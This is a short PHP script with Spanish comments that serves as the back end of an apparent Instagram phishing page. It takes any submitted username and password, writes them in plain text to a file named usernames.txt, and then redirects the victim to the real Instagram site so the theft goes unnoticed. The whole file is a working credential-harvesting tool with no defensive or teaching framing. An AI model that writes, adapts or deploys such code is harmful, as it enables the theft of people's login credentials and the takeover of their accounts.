<?php
// Solo ejecuta esto si los datos realmente fueron enviados por el formulario (POST)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Validamos que existan los datos para que no tire warning
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    if (!empty($username) || !empty($password)) {
        file_put_contents("usernames.txt", "Instagram Username: " . $username . " . Pass: " . $password . "\n", FILE_APPEND);
    }

    $url = "https://instagram.com"; 
    header("Location: $url");
    exit();
} else {
    // Si entran directo sin pasar por el formulario, los mandamos a tu diseño visual
    header("Location: login.html.php"); 
    exit();
}
?>
